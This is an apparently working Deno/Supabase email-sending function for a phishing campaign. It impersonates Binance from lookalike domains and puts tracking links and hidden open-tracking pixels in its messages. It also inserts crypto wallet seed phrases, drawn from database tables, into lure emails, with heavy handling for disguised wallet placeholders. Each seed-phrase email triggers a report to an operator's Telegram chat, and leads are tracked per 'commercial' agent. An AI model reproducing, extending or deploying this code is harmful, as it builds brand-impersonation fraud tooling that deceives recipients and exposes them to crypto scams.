
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "npm:resend@2.0.0";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";

// Initialize Resend with default API key
let resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface EmailRequest {
  to: string;
  name: string;
  first_name: string;
  user_id: string;
  contact_id?: string;
  template_id?: string;
  subject?: string;
  content?: string;
  commercial_id?: string;
  domain?: string;
  wallet?: string;
  step?: number;
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step }: EmailRequest = await req.json();
    
    console.log('Email request received:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, domain, step });

    // Select API key and domain based on user choice
    let apiKey = Deno.env.get("RESEND_API_KEY"); // Default domain 1
    let fromDomain = "mailersrp-1binance.com";
    
    if (domain === "domain2") {
      apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
      fromDomain = "mailersrp-2binance.com";
    }
    
    // Initialize Resend with the selected API key
    resend = new Resend(apiKey);
    
    console.log('Using domain:', fromDomain);

    // Initialize Supabase client
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? ""
    );

    // Fetch the current server IP from the database
    const { data: serverConfig, error: configError } = await supabase
      .from('server_config')
      .select('current_server_ip')
      .single();

    let currentServerIp = '127.0.0.1'; // fallback IP
    if (configError) {
      console.warn('Could not fetch server config, using fallback IP:', configError);
    } else if (serverConfig?.current_server_ip) {
      currentServerIp = String(serverConfig.current_server_ip);
    }

    console.log("Current server IP from database:", currentServerIp);

    // Generate tracking code - use contact_id if available, otherwise use user_id with timestamp
    const trackingCode = contact_id || `${user_id}_${Date.now()}`;
    // Add commercial tracking to the link if commercial_id is provided
    const commercialParam = commercial_id ? `&c=${commercial_id}` : '';
    const trackingLink = `https://fr.bnbsafeguard.com/?=${trackingCode}${commercialParam}`;

    // Calculate current time minus 10 minutes in UTC
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');

    // Create tracking pixel URL for open tracking
    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingCode}`;

    // Process template content if provided
    let emailSubject = subject || "Your Secure WireGuard Access Link";
    let emailContent = content || `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: white; color: black;">
        <h2 style="color: #f59e0b;">Hello {{first_name}},</h2>
        
        <p>We hope this email finds you well.</p>
        
        <p>Your secure WireGuard access link is ready:</p>
        
        <div style="text-align: center; margin: 30px 0;">
          <a href="{{link}}" 
             style="background-color: #f59e0b; color: black; padding: 15px 30px; 
                    text-decoration: none; border-radius: 5px; font-weight: bold;">
            Access Your Secure Connection
          </a>
        </div>
        
        <p>This link is personalized for you and provides secure access to our WireGuard VPN service.</p>
        
        <p><strong>Current Server IP:</strong> {{current_ip}}</p>
        <p><strong>Generated at:</strong> {{current_time_minus_10}}</p>
        
        <p>Best regards,<br>
        The BINANCE Team</p>
        
        <hr style="margin: 30px 0; border: 1px solid #e5e7eb;">
        <p style="font-size: 12px; color: #6b7280;">
          This is an automated message. Please do not reply to this email.
        </p>
      </div>
    `;

    // Check if the email content contains wallet placeholders
    const hasWalletPlaceholder = (content: string) => {
      // Simple check for {{wallet}} first
      if (/\{\{\s*wallet\s*\}\}/i.test(content)) {
        return true;
      }
      
      const normalizedContent = content
        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
        .replace(/[\uFF5B]/g, '{')
        .replace(/[\uFF5D]/g, '}')
        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
        .replace(/\u00A0/g, ' ');
      
      return /\{\{[\s]*wallet[\s]*\}\}/i.test(normalizedContent) ||
             /\{\{\{[^}]*wallet[^}]*\}\}\}/i.test(normalizedContent) ||
             /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/i.test(normalizedContent);
    };

    // Function to get the actual seed phrase assigned to this commercial/user
    const getUniqueWallet = async () => {
      try {
        // If a wallet is explicitly provided in the request payload, use it
        if (wallet && typeof wallet === 'string' && wallet.trim().length > 0) {
          return wallet.trim();
        }

        // Only call get-wallet function if we actually need a new wallet
        console.log('Calling get-wallet function for user:', user_id, 'commercial:', commercial_id);
        const { data: walletData, error: getWalletError } = await supabase.functions.invoke('get-wallet', {
          body: { 
            user_id: user_id,
            commercial_id: commercial_id 
          }
        });

        if (getWalletError) {
          console.error('Error calling get-wallet function:', getWalletError);
        } else if ((walletData as any)?.phrase || (walletData as any)?.wallet) {
          console.log('Got wallet from get-wallet function');
          return ((walletData as any).phrase || (walletData as any).wallet) as string;
        }

        // First, try to find an existing wallet assigned to this commercial
        if (commercial_id) {
          // Check wallets table first
          const { data: assignedWallet, error: walletError } = await supabase
            .from('wallets')
            .select('wallet_phrase')
            .eq('used_by_commercial_id', commercial_id)
            .eq('status', 'used')
            .single();

          if (!walletError && assignedWallet?.wallet_phrase) {
            console.log('Using assigned wallet for commercial:', commercial_id);
            return assignedWallet.wallet_phrase;
          }

          // Check generated_wallets table as backup
          const { data: generatedWallet, error: genWalletError } = await supabase
            .from('generated_wallets')
            .select('seed_phrase')
            .eq('commercial_id', commercial_id)
            .single();

          if (!genWalletError && generatedWallet?.seed_phrase) {
            console.log('Using generated wallet for commercial:', commercial_id);
            return generatedWallet.seed_phrase;
          }
        }

        console.warn('No available wallet found for this commercial/user.');
        return '';
      } catch (error) {
        console.error('Error retrieving wallet phrase:', error);
        return '';
      }
    };

    // Replace template variables for both custom content and default template
    // Use commercial_id and contact_id for the home link to track both commercial and lead
    const homeLink = commercial_id && contact_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id}` : 
                    commercial_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}` : trackingLink;
    
    // Replace non-wallet variables first
    emailContent = emailContent
      .replace(/{{name}}/g, name)
      .replace(/{{first_name}}/g, first_name)
      .replace(/{{email}}/g, to)
      .replace(/{{phone}}/g, '') // Phone not available in email context
      .replace(/{{current_ip}}/g, currentServerIp)
      .replace(/{{link}}/g, trackingLink)
      .replace(/{{home_link}}/g, homeLink)
      .replace(/{{current_time_minus_10}}/g, formattedTime)
      .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');

    // Only process wallet placeholders if they exist in the content
    console.log('Checking if email content contains wallet placeholders...');
     const skipWalletByStep = typeof step === 'number' && (step === 1 || step === 2);
     const walletPlaceholdersDetected = !skipWalletByStep && (hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject));
     let walletWasUsed = false;
     if (walletPlaceholdersDetected) {
       console.log('Wallet placeholders found and step not 1/2, processing wallet replacements...');
      
      // Normalize braces and invisible spaces, then replace wallet placeholders
      const normalizeBraces = (s: string) => s
        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
        .replace(/[\uFF5B]/g, '{')
        .replace(/[\uFF5D]/g, '}');

      emailContent = normalizeBraces(emailContent);
      emailSubject = normalizeBraces(emailSubject);
      
      // Remove zero-width chars entirely; convert NBSP to space
      emailContent = emailContent
        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
        .replace(/\u00A0/g, ' ');

      // Get wallet once and reuse it for all replacements
      const uniqueWallet = await getUniqueWallet();
      if (!uniqueWallet || uniqueWallet.trim() === '') {
        console.error('Wallet placeholder present but no available wallet could be obtained. Aborting send.');
        return new Response(
          JSON.stringify({ success: false, error: 'No available wallet to fill template.' }),
          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
      }
      console.log('Using wallet for replacements (first 10 chars):', uniqueWallet.substring(0, 10) + '...');

      // Replace ONLY actual {{wallet}} placeholders
      emailContent = emailContent.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);
      emailSubject = emailSubject.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);

      // Replace placeholders where letters of "wallet" are split by spaces/tags
      const walletWordPattern = 'w(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*a(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*e(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*t';
      const brokenWalletRegex = new RegExp(`\\{\\{(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*${walletWordPattern}(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*\\}\\}`, 'gi');
      emailContent = emailContent.replace(brokenWalletRegex, uniqueWallet);

      // Replace complex placeholders split by inline tags around braces
      const complexWalletRegex = /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/gi;
      emailContent = emailContent.replace(complexWalletRegex, uniqueWallet);

      // Handle triple braces {{{wallet}}}
      emailContent = emailContent.replace(/\{\{\{[^}]*wallet[^}]*\}\}\}/gi, uniqueWallet);
      
      // Final cleanup for any remaining wallet placeholders
      emailContent = emailContent.replace(/\{\{[^}]*wallet[^}]*\}\}/gi, uniqueWallet);
      
      // Mark that a wallet was effectively used in this email
      walletWasUsed = true;
    } else {
      console.log('No wallet placeholders found in email content or subject, skipping wallet assignment');
    }

    // Remove debug/listing blocks accidentally pasted into templates
    // - Any "Available" labels
    // - Any lines like "Email: user_123456"
    // - Long lowercase-only word sequences (likely pasted seed phrases)
    emailContent = emailContent
      .replace(/Available/gi, '')
      .replace(/Email:\s*user_[0-9]+/gi, '');
      // Removed aggressive seed-like sequence stripping to preserve intended wallet phrases

    if (subject) {
      emailSubject = subject
        .replace(/{{name}}/g, name)
        .replace(/{{first_name}}/g, first_name)
        .replace(/{{email}}/g, to)
        .replace(/{{current_ip}}/g, currentServerIp)
        .replace(/{{link}}/g, trackingLink)
        .replace(/{{home_link}}/g, homeLink)
        .replace(/{{current_time_minus_10}}/g, formattedTime)
        .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
    }

    // Add tracking pixel to email content
    emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;

    // Log email sending attempt
    console.log("Sending email to:", to, "with tracking code:", trackingCode);
    console.log("Server IP used:", currentServerIp);

    const emailResponse = await resend.emails.send({
      from: fromDomain === "mailersrp-2binance.com" 
        ? "BINANCE <noreply@mailersrp-2binance.com>"
        : "BINANCE <donotreply@mailersrp-1binance.com>",
      to: [to],
      subject: emailSubject,
      html: emailContent,
      tags: [
        {
          name: 'campaign',
          value: 'wireguard-marketing'
        },
        {
          name: 'tracking_code',
          value: trackingCode
        },
        {
          name: 'step',
          value: step ? `step-${step}` : 'step-1'
        }
      ]
    });


    console.log("Marketing email sent successfully:", emailResponse);

    // Send Telegram notification if wallet was used in email (send directly to Telegram; fallback to edge function)
    if (walletWasUsed) {
      try {
        const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
        const telegramChatId = '1889039543';
        let sent = false;
        if (telegramBotToken) {
          const message = `📧 Email sent with wallet!\nRecipient: ${to}\nCommercial ID: ${commercial_id}\nStep: ${step || 1}\nSubject: ${emailSubject}\nTracking: ${trackingCode}`;
          const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
          });
          if (!tgRes.ok) {
            const err = await tgRes.text();
            console.error('Telegram send failed (direct):', err);
          } else {
            console.log('Telegram notification sent (direct) for wallet email step', step || 1);
            sent = true;
          }
        } else {
          console.error('TELEGRAM_BOT_TOKEN missing in environment');
        }
        // Fallback via edge function
        if (!sent) {
          try {
            await supabase.functions.invoke('send-telegram-notification', {
              body: {
                message: `📧 Email sent with wallet!\nRecipient: ${to}\nCommercial ID: ${commercial_id}\nStep: ${step || 1}\nSubject: ${emailSubject}\nTracking: ${trackingCode}`
              }
            });
            console.log('Telegram notification sent via edge function fallback');
          } catch (invokeErr) {
            console.error('Telegram fallback invoke failed:', invokeErr);
          }
        }
      } catch (telegramError) {
        console.error('Error sending Telegram notification for email:', telegramError);
        // Don't fail the email send if Telegram fails
      }
    }

    // Log to database in background (non-blocking)
    EdgeRuntime.waitUntil(
      supabase.from('email_logs').insert({
        tracking_code: trackingCode,
        recipient_email: to,
        recipient_name: name,
        contact_id: contact_id,
        user_id: user_id,
        template_id: template_id,
        subject: emailSubject,
        status: 'sent',
        sent_at: new Date().toISOString(),
        resend_id: emailResponse.data?.id,
        commercial_id: commercial_id
      })
    );

    return new Response(JSON.stringify({
      success: true,
      message: "Email sent successfully",
      tracking_code: trackingCode,
      email_id: emailResponse.data?.id,
      recipient: to,
      server_ip_used: currentServerIp
    }), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
        ...corsHeaders,
      },
    });
  } catch (error: any) {
    console.error("Error in send-marketing-email function:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
